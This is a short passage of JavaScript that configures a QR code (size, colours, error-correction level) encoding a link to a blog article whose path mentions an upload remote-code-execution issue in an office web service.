text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 